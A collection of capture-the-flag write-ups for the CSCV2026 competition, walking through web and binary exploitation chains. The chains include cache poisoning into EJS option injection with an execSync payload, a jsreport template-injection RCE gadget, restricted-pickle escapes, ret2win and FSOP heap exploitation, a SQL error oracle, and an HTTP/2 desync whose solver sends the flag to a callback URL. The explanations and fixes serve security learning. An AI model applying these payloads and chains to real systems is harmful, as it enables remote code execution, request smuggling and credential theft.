## Qualifiers · Web

### Chromatic — from cache poisoning to renderer RCE

**Category:** Web

**Result:** solved against the supplied local Docker stack. The bundled stack returned `flag{random_flag}`; I did not recover a remote competition flag.

The source files that matter are `web/server/server.js`, `edge/nginx.conf`, `web/frontend/src/legacy-blocks.ts`, and `renderer/worker.js`. Following the uploaded bytes through those files explains the solve: they pass as an image, replace a workspace manifest in cache, become trusted HTML in the review bot, and reach an unsafe EJS option.

![Chromatic's home page on desktop.](/evidence/cscv2026/chromatic/01-home-desktop.png)
*The page exposes upload, workspace, and review as separate features.*

```text
upload → shared cache key → workspace manifest → review bot
       → authenticated preview → EJS option injection → telemetry
```

#### 1. Make one body pass as an image and as JSON

`/api/media` checks the upload in two ways. It runs `file` and allows image MIME types, then `hasDocumentPreamble()` rejects a body only when its first non-space byte is `{` or `[`. The workspace frontend later parses the body as JSON. I used an XSSI prefix to get past the first-byte check and placed an SVG marker inside a JSON string:

Here is a reduced manifest that shows the format (the exploit's `blocks` value carries the archive gadget):

```text
)]}'
{"_":"<!doctype svg","name":"Shared board","owner":"guest","blocks":[]}
```

The bytes pass each check for a different reason. `file` searches the first 4096 bytes and finds the SVG marker inside the JSON string. `hasDocumentPreamble()` skips whitespace, sees `)` first, and only rejects `{` or `[`. Angular removes `)]}'` and parses the remaining JSON. No check confirms that the upload is only an image.

#### 2. Put the uploaded bytes in the workspace cache slot

The Nginx cache key normally identifies which response belongs to a request. Here, when a request has a valid `workspace` parameter, the map uses that ID instead of the request path. So these two different routes share one cache slot:

```nginx
map $request_uri $representation_id {
    "~*[?&]workspace=(?<workspace_id>[0-9a-f]{24})(?:&|$)" $workspace_id;
    default $request_uri;
}

proxy_cache_key "$scheme|$request_method|$representation_id";
```

```text
/api/media/raw?id=ASSET_ID&workspace=WORKSPACE_ID
/api/workspaces/manifest?workspace=WORKSPACE_ID
```

Both requests become the same key:

```text
GET /api/media/raw?id=A&workspace=W       → $scheme|GET|W
GET /api/workspaces/manifest?workspace=W   → $scheme|GET|W
```

I request `/api/media/raw` first, which stores the uploaded bytes in that slot for 600 seconds. The manifest request then gets those bytes instead of the default JSON. The solver checks the collision with a throwaway ID and the `X-Asset-Id` response header before involving the bot.

#### 3. Turn the cached manifest into a browser gadget

In `legacy-blocks.ts`, an `archive` block is base64-decoded and checked for a version and an FNV-1a checksum. The checksum is just a number anyone can recalculate; it doesn't prove who wrote the markup. The handler then passes that markup to `bypassSecurityTrustHtml()`, telling Angular to render it as HTML. That's the injection point.

The page blocks inline scripts. I use an iframe `srcdoc` to load the site's allowed `/static/board-compat.js`; `srcdoc` keeps the page's origin and policy. The script reads `window.__chromaticBridge`. Browsers expose a form by its `id` as a `window` property, and its named inputs as properties on the form. So a form with that ID can give the script its endpoint, telemetry channel, and request body. That is DOM clobbering: HTML elements supply values where the script expected a JavaScript object.

#### 4. Follow the request to the code-execution sink

`POST /api/report` asks the bot to open the workspace. Its browser has an `HttpOnly` admin cookie. My script can't read the cookie, but the browser sends it with a same-origin request to `/api/admin/export-preview`.

The route checks the cookie and that `theme` is an object, but it doesn't restrict the keys inside it. `renderer/worker.js` merges those keys into EJS options. EJS 3.1.6 builds a line of JavaScript by concatenating `outputFunctionName` directly into it:

```javascript
var <outputFunctionName> = __append;
```

The solver supplies `__p = 1; return ...; var __q`, so EJS generates:

```javascript
var __p = 1;
return /* command output */;
var __q = __append;
```

The value is supposed to be a variable name. Since EJS doesn't validate it, the semicolons turn it into executable statements.

The injected option breaks out of the generated statement and returns command output:

```javascript
__p = 1;
return process.mainModule.require('child_process')
  .execSync('/readflag /flag').toString();
var __q
```

The renderer runs as UID 10001; the supplied SUID `/readflag` helper can read the mode-0400 `/flag`. The preview response returns through the browser gadget into `/api/telemetry/<channel>`, which the solver polls.

The source-level mistakes are the cache key sharing one slot across routes and the renderer merging untrusted `theme` keys into EJS options. Keep routes distinct in the cache key, allowlist renderer settings, and use a patched EJS release.

### Exam Score — when a score email becomes a template

**Category:** Web

**Result:** full chain reproduced against my local challenge copy. The returned value is a local fixture, not a remote competition flag.

The connection between the two routes is the whole trick: `/api/email` writes a file using my input, then `/api/export` lets me choose a file for jsreport to render. I use the first route to plant Handlebars text and the second to make the renderer execute it.

![Exam Score's score lookup interface on desktop.](/evidence/cscv2026/exam-score/01-desktop.png)
*The challenge frontend: two score types and a candidate-number lookup.*

#### 1. Save my input into an email draft

I send my Handlebars text as the `name` field in `POST /api/email`. In `server/mail.js`, the email template inserts it as `{{{name}}}`. Triple braces skip HTML escaping; the app's sanitizer strips tags, but my payload has no HTML tags to strip. Nodemailer writes the resulting `.eml` file as `data/mail-drafts/<timestamp>-score-report-export.eml`, and `/api/email` returns that filename.

For local reproduction, I removed the route's early `503` check; otherwise it exits before Nodemailer can save a draft. I leave SMTP unset so the draft filename is returned. A first direct payload broke because quoted-printable email encoding changed `=` to `=3D` and wrapped long lines. Padding each short Handlebars expression kept it intact.

#### 2. Tell jsreport to render the draft

`/api/export` accepts a template path and a data object. `loadTemplate()` rejects `..`, then calls `path.resolve(TEMPLATES_DIR, name)`, but never checks that the result stays under `TEMPLATES_DIR`. An absolute path wins outright:

```js
path.resolve("/app/templates", "/app/data/mail-drafts/run.eml")
// /app/data/mail-drafts/run.eml
```

I pass the path returned by `/api/email`. The app reads that file and sends its contents to jsreport as a Handlebars template.

#### 3. Give the template the objects it needs

The template expressions need a few objects supplied through `data`. The important values are `O: {"$ref":"constructor"}`, an empty array `a`, the string `c: "constructor"`, and `y`, an array-like object whose first item is the JavaScript payload.

Here is what that gadget does:

1. jsreport's `$ref` resolver looks up `constructor` on a plain object. Because it doesn't require an own property, JavaScript's inherited `constructor` resolves to the built-in `Object` function.
2. `Object.getPrototypeOf(a)` reaches `Array.prototype`. A prototype is where JavaScript objects inherit shared properties; its property descriptors describe those properties and how they behave.
3. The payload copies those descriptors onto Handlebars' root context, then copies `y` there. This makes the template helpers pass the JavaScript string through as an array-like value.
4. It reads `Function` from the constructor property of `Function.prototype` and invokes it with that string. `Function` compiles the string as JavaScript, so the renderer now runs the payload.

`readExportRequest()` cleans strings and rejects `$values` reference envelopes, but it doesn't restrict the other fields in this data object. I first tried modifying `Object.prototype`; that was the wrong context. The solver targets Handlebars' root context instead. It also removes helper properties from `Object.prototype` before starting a child process, or Node 12 tries to convert those inherited objects and errors out.

#### 4. Read the internal asset and get the response back

The JavaScript runs inside jsreport, and jsreport already has the password in its environment. It asks the internal service for a one-use nonce, computes an HMAC-SHA256 proof with that password, then requests the asset:

```text
jsreport environment: password
    │
    ├─ GET /challenge ─────────────→ one-use nonce
    ├─ HMAC-SHA256(password, nonce) → proof
    └─ POST /assets/ + Origin ──────→ asset bytes
                                      ↓
                                rendered PDF
```

The service checks the origin, nonce, and proof. The HMAC isn't broken: the injected code runs in a process that already has the secret. Its response becomes part of the PDF. My local working copy returned `CSCV2026{TEST_FLAG}`, shown below; the downloadable player bundle has the marker `ASSETS` in its asset file. Neither is a remote competition flag.

The core bug is that the caller can choose a file outside the template directory and ask the renderer to execute it. Accept template IDs instead of paths, verify the resolved path stays under the template directory, and keep the asset-service secret out of the rendering process.

![First page of the locally generated Exam Score PDF, including the fixture response.](/evidence/cscv2026/exam-score/03-local-render-page-1.png)
*The generated PDF includes the rendered email and the locally returned fixture value.*

#### Solver and files

The complete solver is [`exam_score_solve.py`](/solvers/cscv2026/exam_score_solve.py). It stages the draft, submits the export request, saves the PDF, and extracts its text when `pdftotext` is installed.

### [QUAL-WEB-01] Inoffice — bypassing two parser checks

**Category:** Web  
**Result:** flag recovered during the original remote run  
**Flag:** `CSCV2026{l33t-me+1Nnnn-!!!!!!!!;}`

#### Start by separating the proxy from the application

HAProxy applies two restrictions before it forwards a request:

```text
acl is_office_path path,url_dec -i -m sub office
acl is_multipart req.hdr(Content-Type) -i -m beg multipart/form-data

http-request deny if is_office_path !network_office
http-request deny if is_multipart !network_office
```

The Flask backend, however, exposes `/office-process` and expects a normal multipart upload. The solve is a parser differential: the bytes have to look harmless to HAProxy but normal to Gunicorn/Werkzeug.

#### Hide the path from HAProxy

The request target used in the source solver is:

```http
POST http:%6f%66%66%69%63%65-process?@mmoffice.x.corp HTTP/1.1
Host: mmoffice.x.corp
```

The proxy's path check does not see the protected substring in the form it expects, while the backend resolves the target to `/office-process`.

This is easier to understand if the request is followed byte by byte. The client sends an absolute-form request target, not the usual origin-form path:

```text
POST http:%6f%66%66%69%63%65-process?@mmoffice.x.corp HTTP/1.1
```

HAProxy runs `url_dec` and then applies a substring check to the value it considers the path. The backend does not use HAProxy's ACL result; it parses the request target again and routes it through Werkzeug. The useful question was not “is this URL valid?” but “which component decodes which part, and when?”

I tested the two pieces separately. A request with the correct virtual host but an ordinary `/office-process` path was denied. A request with the encoded target passed the proxy but still had to produce a valid Flask route. That second check prevented me from treating the first bypass as the complete exploit.

#### Hide the multipart prefix from the ACL

The Content-Type starts with a vertical tab:

```http
Content-Type: \x0bmultipart/form-data; boundary=----inoffice-boundary
```

HAProxy's prefix match no longer matches. The backend normalizes the value and still parses the body as multipart. This only works because the two parsers make different choices; a bypass at the proxy is not useful if the framework rejects the same bytes.

The body still has to be boring. It is a normal multipart message with one file field:

```http
--<boundary>
Content-Disposition: form-data; name="file"; filename="work.bin"
Content-Type: application/octet-stream

<pickle bytes>
--<boundary>--
```

The weirdness belongs in the request line and the header prefix. Once the request reaches `request.files['file']`, the application expects an ordinary multipart boundary and an ordinary uploaded object.

#### Escape the restricted pickle loader

The loader rejects direct references to `exec`, `eval`, and `__import__`. It still allows indirect dictionary lookups. The pickle therefore performs the equivalent of:

```python
globals().get('__builtins__').get('__import__')('flask')
getattr(flask, 'abort')(400, open('/flag.txt').read())
```

The deliberate `abort(400, flag)` is useful evidence: the flag is returned in a predictable error response instead of disappearing as a side effect.

The indirect calls are not magic pickle syntax; they are a way around the loader's name filter. `RestrictedUnpickler.find_class()` blocks the obvious dangerous globals, but it still permits helpers such as `globals`, `getattr`, `open`, and `read`. The payload walks through objects that are already available:

```text
globals()
  -> globals()['__builtins__']
  -> builtins['__import__']('flask')
  -> flask.abort(400, open('/flag.txt').read())
```

The flag is passed as the description of the HTTP 400 exception. That gives the solver a response body to collect and avoids needing a second output channel.

#### Solver / Reproduction

The complete request builder is [`inoffice_solve.py`](/solvers/cscv2026/inoffice_solve.py). Against an authorized instance:

```sh
python3 inoffice_solve.py http://HOST:PORT/
```

The expected result is an HTTP 400 whose body contains the flag. The original source notes recorded the 400 response and the flag above. The public target address is intentionally replaced with `HOST:PORT` here so the article does not preserve a dead competition endpoint as if it were a current service.

### [FINAL-PWN-01] PWN01 — PIE leak to ret2win

**Category:** Pwn  
**Result:** remote flag recorded; local control-flow path reproduced  
**Flag:** `CSCV2026{Mea5uR3_7h3_Cl3aN_rUn_no7_gDB}`

#### The leak removes the only moving part

The service prints the runtime address of `main` before reading input. The executable is position-independent, but the offsets inside the image are stable:

```text
main = base + 0x12fc
win  = base + 0x1422
ret  = base + 0x101a
```

The saved return address is `0x58` bytes from the start of the input. The payload therefore needs no gadget search at runtime:

```text
0x58 bytes of padding
base + 0x101a       # alignment ret
base + 0x1422       # win()
```

The extra `ret` advances `rsp` by eight bytes before `win()` executes. That keeps the System V AMD64 stack alignment correct; it is not a second stage or a control-flow detour.

The calculation is worth writing down because it is the whole exploit:

```text
leaked main       = PIE base + 0x12fc
PIE base          = leaked main - 0x12fc
ret gadget        = PIE base + 0x101a
win               = PIE base + 0x1422
saved RIP offset  = 0x58
```

The solver does not guess a base address and it does not need a libc leak. The program gives us one code pointer, and the fixed offsets turn it into the two addresses needed for the return chain. I also kept the `--traced` correction in the solver because the binary masks the printed address when it detects a debugger; that is a small but real reproducibility trap.

#### Solver / Reproduction

The complete pwntools solver is [`pwn01_solve.py`](/solvers/cscv2026/pwn01_solve.py). It can use the challenge archive locally or a remote host:

```sh
python3 pwn01_solve.py
python3 pwn01_solve.py --remote HOST PORT --ssl
```

The stock solver reaches the intended `win()` path, but the extracted local binary has no `flag` file in its working directory. For a controlled local proof, I ran the same extracted binary from a temporary directory with a test-only `flag` file:

```text
[win] verified path:
CSCV2026{LOCAL_TEST_PWN01}
```

That string is a fixture result created only to verify the local control-flow path; it is not the competition flag. The published competition flag is the exact remote result recorded in the original writeup.

### [FINAL-PWN-02] PWN02 — from an authenticated format string to FSOP

**Category:** Pwn  
**Result:** remote flag recorded; the local Docker image intentionally contains a decoy flag  
**Flag:** `CSCV2026{you_6ot_a_5hel1_anD_7h3_re41_F1a6}`

#### Protections point toward the heap

The service is PIE, full RELRO, NX-enabled, stack-canary protected, and built with FORTIFY. A direct return-address overwrite or simple GOT overwrite will not get far. The service also wraps its commands in an authenticated protocol, so the first solve step is reproducing the packet format and deriving the correct session key.

Authenticated frames contain a little-endian sequence number, XOR-encrypted plaintext, and an eight-byte SHA-256 MAC. There are two key worlds: the displayed key reaches ordinary handlers, while the raw `alt/legacy` material derives the privileged session needed for the heap operations.

Before touching the heap, the solver has to preserve the protocol state:

```text
frame = seq || (plaintext XOR keystream) || SHA256(key || seq || plaintext)[:8]
```

The exact framing is implemented in the public solver. The practical lesson is that an otherwise correct heap exploit fails if the sequence number is stale or the wrong session key is used. I treated the protocol as part of the exploit, not as setup boilerplate.

#### Build the primitives in order

The owner setter is also a format string:

```text
opcode 0x10 with data → stores owner
opcode 0x10 with no data → printf(owner)
```

The exploit uses `%p` to leak a PIE/BSS pointer, then places a `%s` argument at owner-buffer offset 248 to obtain an arbitrary read. That read recovers the libc base from the BSS `stdout` pointer and obtains three adjacent heap pointers from the `items[]` array.

The heap sequence is deliberate:

1. Seed the `0x1f0` tcache bin.
2. Allocate three adjacent `0x410` chunks, P/W/B.
3. Free them, then allocate an overlapping `0xb00` region.
4. Forge an unsorted-bin W view and a tcache B view in the overlap.
5. Poison the safe-linked tcache pointer with `target ^ (B >> 12)`.
6. Return an allocation at libc's `_IO_list_all`.

The final object is a fake wide `FILE` structure. Its wide vtable points to `system`, and an invalid outer packet length makes the program return into libc exit processing. The shell is then used to distinguish `/home/ctf/flag` (decoy) from the symlink containing the real challenge flag.

The heap stages have different jobs, so collapsing them into “tcache poisoning to FSOP” hides the useful part:

```text
format string        -> PIE and libc leaks
stale item pointers  -> overlapping heap views
safe-linking poison  -> allocation at _IO_list_all
fake wide FILE       -> system(" sh") during exit cleanup
shell                -> locate the real flag file
```

Safe-linking is why the poisoned forward pointer is written as `target ^ (chunk >> 12)` rather than as the target address itself. The fake `FILE` is also why the target is not a normal function pointer: glibc's exit/flush path supplies a legitimate call site that eventually reaches the forged wide vtable.

Relevant offsets from the challenge's libc are:

```text
_IO_list_all       = libc + 0x21b680
_IO_wfile_jumps    = libc + 0x2170c0
system             = libc + 0x050d70
```

### [FINAL-WEB-01] Baby SQL1 — an error-status oracle

**Category:** Web  
**Result:** flag recovered during the original browser run  
**Flag:** `CSCV2026{R3g3xp_oRaC13_th3N_f0rg3_7he_5es510n}`

#### Reach the real handlers first

The landing page contains links to `query.php` and `debug.php`, but Apache blocks the bare paths. A trailing slash routes through PATH_INFO:

```text
/query.php/  → invoice search
/debug.php/  → custom-session endpoint
```

`/debug.php/?debug=true` discloses the session seed, round count, cookie name, and the fact that the application reads `CURRENT_USER` from the database before validating the cookie. That last ordering detail matters: on broken instances, both endpoints returned 500 before any cookie candidate could be tested.

#### Prove the 500/200 oracle

The invoice search parameter did not produce a stable extraction channel. The `order` parameter did. A normal expression returned the invoice page with 200; a deliberately failing expression returned 500. Wrapping the failure-producing expression in a condition makes the status code answer one bit:

```text
HTTP 500 → condition true
HTTP 200 → condition false
```

The predicate checks a prefix of the database identity using MySQL `REGEXP`, `_utf8mb4`, and a binary collation. The solver extracts one character at a time from `CURRENT_USER`, recovering `svatttadm1n001@%` in the verified run.

The extraction loop is a small search, not a blind dump. For a candidate prefix `p`, the solver asks whether the value matches `^p`. It escapes regex metacharacters before hex-encoding the pattern, so a character such as `.` is tested literally. At each position there should be exactly one candidate that produces HTTP 500; if there are zero or two, the oracle is not stable enough to continue.

That check saved time during the original run. My first idea was to use the invoice response as an output channel, but the response content was not stable. The status code was much less interesting and much more reliable.

![The true branch of the SQL oracle returns an internal server error.](/evidence/cscv2026/web01/04-oracle-true-500.png)
*True predicate: the error branch is reachable.*

![The false branch returns the normal invoice page.](/evidence/cscv2026/web01/05-oracle-false-200.png)
*False predicate: the normal 200 response.*

#### Invert the session transform locally

The disclosed source contains the HMAC seed, whitening domains, 24 Feistel rounds, and target construction. Once the exact `CURRENT_USER` is known, the permutation can be inverted locally to forge `CUSTOM_SESSION`. This is a useful separation of concerns: SQLi recovers the database identity; the local crypto code turns that identity into the cookie.

The cookie transform is a 24-round Feistel-like permutation with whitening before and after the rounds. A Feistel construction is convenient here because every round is reversible even when the round function itself is not. To reverse it, the solver walks from round 23 down to round 0 and swaps the left/right halves in the reverse order. The HMAC calls are not being attacked; they are used exactly as the application uses them once the missing `CURRENT_USER` value is known.

The full solver is [`web01_baby_sql1_solver.py`](/solvers/cscv2026/web01_baby_sql1_solver.py):

```sh

```

### [FINAL-WEB-02] Northstar — a Classic session migrated into admin

**Category:** Web  
**Result:** flag recovered in an earlier remote run; I could not replay it now  
**Flag:** `CSCV2026{leg4cY_iDeNtity_migr4t10N_c0mP1e73}`

#### The two versions share more state than they should

Northstar has a Classic interface and a Version 2 interface. The solve crosses that boundary:

1. Unauthenticated `checkEmail(email:)` returns a valid `legacy-browser` JWT for seeded users.
2. With the token and a Chrome-like user agent, `updateUserPassword(...)` changes the password without the old password.
3. A normal Version 2 account calls the migration verification and confirmation endpoints with the reset support account.
4. The imported message reveals the administrator address.
5. The Classic `accountDirectory(keyword:)` query accepts stacked SQL and updates the administrator's date of birth.
6. The admin migration succeeds with that new security answer, enabling the admin message endpoint.

The chain only made sense after I checked what the old and new interfaces actually shared: identity, password state, migration records, and security answers. The migration was the bridge between the two systems.

The important failure is an authorization boundary, not merely a weak password reset. `checkEmail` gives a Classic identity token without proving control of the address. The password-reset mutation trusts that token and a browser-like user agent. The newer application then accepts the reset account as a migration source. Each endpoint looks like a small legacy compatibility feature; together they let an attacker move from an email lookup to a privileged identity.

The final GraphQL injection changes the administrator's date of birth rather than directly reading the flag. That is a useful detail: the injected statement repairs the answer required by the V2 migration flow. The query result is mostly noise; the state change is the effect that matters.

### [FINAL-WEB-03] re-strictions — HAProxy H2 trailer desync

**Category:** Web  
**Result:** flag recovered remotely; the local Docker fixture also exercised the request path

#### The visible request is not the request Gunicorn parses

HAProxy protects `/office/process` and multipart uploads with ACLs. The backend is a Flask upload route using a restricted pickle loader. A malformed Content-Type prefix is not enough: HAProxy may be bypassed, but Werkzeug can still reject the body before `request.files` exists.

The successful path uses three parser views:

```text
HTTP/2 frames → HAProxy's H2 accounting → generated HTTP/1 → Gunicorn/Werkzeug
```

This is a request-smuggling problem across a protocol-conversion boundary. HTTP/2 carries each stream with explicit frame lengths, while the backend receives one HTTP/1 byte stream. The stream ID disappears during conversion. If HAProxy decides where one stream ends using a different body length than Gunicorn uses on the generated HTTP/1 connection, bytes from a later stream can become part of an earlier request.

That is the part I wanted to preserve here: “the proxy saw a safe request” and “the backend executed a forbidden request” can both be true because they refer to different serializations of the same connection.

#### Consume the missing body with the next stream

Stream 1 declares `content-length: 49`, then ends in trailing headers without sending DATA. In the affected HAProxy trailer path, the missing-body check is skipped. HAProxy forwards a safe-looking request:

```http
GET / HTTP/1.1
host: x
content-length: 49
```

Gunicorn returns the response but still expects 49 body bytes. Stream 3 sends headers that HAProxy serializes to exactly those 49 bytes:

```http
POST / HTTP/1.1
host: x
content-length: <inner request length>

```

Gunicorn consumes those bytes as the missing body of stream 1. The DATA that follows is then parsed as a new HTTP/1 request, this time containing:

```http
POST /office/process HTTP/1.1
Content-Type: multipart/form-data; boundary=...
```

HAProxy applied its ACLs to `GET /` and `POST /`; Gunicorn eventually sees the hidden multipart `/office/process`. That is the desynchronization.

The byte accounting is the part that made this solve click for me. The first stream claims a 49-byte body, but sends no DATA. Its END_STREAM arrives as a trailing-header block. HAProxy 2.9.7 forwards the request without rejecting the outstanding body length. Gunicorn, which only sees the generated HTTP/1 request, is now waiting for 49 bytes.

The next stream is chosen so its generated header block is exactly 49 bytes:

```text
POST / HTTP/1.1\r\n
host: x\r\n
content-length: <inner length>\r\n
\r\n
```

Those bytes satisfy the first request's body. The later DATA bytes are then read by the backend's HTTP/1 parser as a new request. This is why the solver asserts `len(safe_h1) == 49`; the number is the bridge between the two parsers.

HAProxy's ACLs inspect the safe H2 headers (`GET /` and `POST /`). They never see `/office/process` in an H2 header. Gunicorn sees it only after the proxy has already made its access decision.

#### Escape the restricted loader

The pickle avoids a direct forbidden `builtins.__import__` reference. It reaches the builtins dictionary indirectly, obtains `__import__`, imports Flask, reads `/flag.txt`, and calls `flask.abort(400, flag)`. The error status is intentional: it reflects the result through a response that the solver can collect.

The loader is a second boundary, independent of the proxy bug. Even after the desync reaches the backend, a direct `builtins.__import__` reference is rejected. The payload instead uses permitted dictionary access to recover the same callable. That two-stage design is why a simple ACL bypass was not enough: first reach the upload route, then find an object graph accepted by the restricted unpickler.

Was this a zero-day? I would not label it that way from the evidence I have. The challenge pins HAProxy 2.9.7, and the [HAProxy 2.9 bug tracker](https://www.haproxy.org/bugs/bugs-2.9.html) later lists fixes for H2 body-length handling while parsing request trailers. That is very close to the accounting mistake exercised here, so the public record does not support calling the behavior unknown to the vendor by the time I am writing this. It is still a valuable CTF reproduction: it shows exactly how a subtle H2-to-H1 length mismatch becomes a bypass against real backend routing.

For background, HAProxy's [HTX deep dive](https://www.haproxy.com/blog/sanitizing-http1-a-technical-deep-dive-into-haproxys-htx-abstraction-layer) explains how HTTP/1 messages are normalized internally and why the interesting cases are usually at conversion boundaries rather than the old textbook `Content-Length` versus `Transfer-Encoding` pair.

#### What I would change in a real deployment

The proxy should reject a stream when the declared Content-Length does not equal the DATA bytes before END_STREAM, including when END_STREAM is carried by trailers. Updating HAProxy is the first fix. I would also apply the authorization check in the backend, because a proxy ACL should not be the only thing protecting `/office/process` or multipart uploads. Finally, I would avoid forwarding ambiguous request bodies across an H2-to-H1 hop unless the proxy and backend agree on one canonical framing rule.

#### Solver / Reproduction

The H2 solver is [`web03_h2_desync_solve.py`](/solvers/cscv2026/web03_h2_desync_solve.py). It requires Python `h2` and a TLS endpoint that negotiates ALPN `h2`:

```sh
python3 -m pip install h2
python3 web03_h2_desync_solve.py --host HOST --port 1337 --insecure
```

The local Docker stack exposes plain HTTP/1, so the TLS+ALPN solver is not the right client for that fixture. I used the alternate command-mode client against the local proxy and sent the flag to a local callback:

```sh
python3 web03_command_solve.py \
  --host 127.0.0.1 --port 31337 \
  --callback http://172.22.0.1:8088/
```

The captured callback body was:

```text
CALLBACK_BODY=FLAG{FLAG_FOR_TESTING}
```

That callback came from the local fixture, not the competition service. The local stack also showed why the baseline screenshot matters: a direct multipart request is denied before the hidden request path is introduced.
